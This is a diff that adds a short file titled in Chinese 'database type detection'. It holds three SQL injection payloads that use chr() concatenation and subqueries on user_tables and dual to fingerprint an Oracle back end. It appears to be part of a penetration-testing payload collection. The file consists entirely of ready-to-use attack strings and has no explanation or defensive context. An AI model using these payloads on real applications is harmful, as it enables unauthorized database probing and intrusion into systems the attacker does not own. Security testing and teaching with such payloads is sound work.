@@ -1,0 +1,4 @@
+数据库类型判断
+-1' or chr(123)||chr(123)=chr(123)||chr(123) -- 
+-1' or (select count (*) from user_tables)>0 --
+-1' or (select count (*) from dual)>0 --
